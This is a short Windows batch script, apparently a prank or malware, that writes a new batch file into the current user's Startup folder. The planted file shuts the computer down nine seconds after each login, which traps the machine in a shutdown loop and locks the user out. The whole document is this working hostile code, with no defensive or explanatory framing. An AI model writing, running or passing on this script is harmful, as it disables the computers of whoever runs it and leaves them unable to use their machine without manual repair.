@echo off

setlocal enabledelayedexpansion

set "where=%~dp0"
set "desktop=%USERPROFILE%\Desktop"
set "here=C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"

set "timestamp=%date:~4,2%%date:~7,2%%time:~0,2%%time:~3,2%%time:~6,2%"
set "filename=%timestamp%"


echo @echo off > "%here%\%filename%.bat"
echo shutdown -s -t 9 >> "%here%\%filename%.bat"


exit 0
